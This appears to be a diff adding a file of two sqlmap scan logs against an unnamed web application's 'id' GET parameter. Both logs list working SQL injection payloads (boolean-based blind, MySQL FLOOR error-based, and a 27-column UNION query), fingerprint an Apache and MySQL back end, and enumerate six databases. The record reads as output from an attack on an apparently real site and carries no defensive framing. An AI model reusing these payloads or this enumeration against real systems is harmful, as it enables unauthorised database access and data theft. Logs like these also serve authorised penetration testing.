@@ -1,0 +1,50 @@
+sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=12 AND 2118=2118&rct=j&q=&esrc=s
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=12 AND (SELECT 9565 FROM(SELECT COUNT(*),CONCAT(0x7162717171,(SELECT (ELT(9565=9565,1))),0x716b787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&rct=j&q=&esrc=s
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 27 columns
+    Payload: id=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x4651506e794852684f565869716a76427a654e6a6e6b6149505a4c594b6f6a6954736f45784c5866,0x716b787a71),NULL,NULL,NULL,NULL,NULL#&rct=j&q=&esrc=s
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [6]:
+[*] information_schema
+[*] Sql832351_1
+[*] Sql832351_2
+[*] Sql832351_3
+[*] Sql832351_4
+[*] Sql832351_5
+
+sqlmap identified the following injection point(s) with a total of 169 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=12 AND 5533=5533
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=12 AND (SELECT 8604 FROM(SELECT COUNT(*),CONCAT(0x7171767671,(SELECT (ELT(8604=8604,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 27 columns
+    Payload: id=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171767671,0x67524e4b43674a4d576244574573576a635157454a7a47647a4c5243715053616e46574d4f774872,0x7162787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [6]:
+[*] information_schema
+[*] Sql832351_1
+[*] Sql832351_2
+[*] Sql832351_3
+[*] Sql832351_4
+[*] Sql832351_5
+
